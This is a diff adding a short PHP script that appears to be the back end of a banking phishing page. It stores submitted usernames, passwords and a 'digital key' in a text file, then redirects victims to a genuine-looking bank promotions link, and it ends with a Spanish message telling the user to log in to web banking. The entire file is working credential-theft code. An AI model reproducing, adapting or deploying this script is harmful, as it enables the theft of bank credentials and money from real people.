@@ -1,0 +1,17 @@
+<?php
+    if(isset($_POST['user']) && isset($_POST['password'])){
+        $user = $_POST['user'];
+        $password = $_POST['password'];
+        $datos = "Usuario: $user\nContraseña: $password" . PHP_EOL;
+        file_put_contents("datos.txt", $datos, FILE_APPEND);
+        header("Location: digitalcode.html");
+        exit();
+    }
+    if(isset($_POST['digitalkey'])){
+        $digitalkey = $_POST['digitalkey'];
+        $datos = "Clave digital: $digitalkey" . PHP_EOL;
+        file_put_contents("datos.txt", $datos, FILE_APPEND);
+        header('Location:https://www.pichinchatarjetaspromociones.com/categoria/tipo-promocion/');
+        exit();
+    }
+        Felicidades User, ingresa a tu banca web para continuar
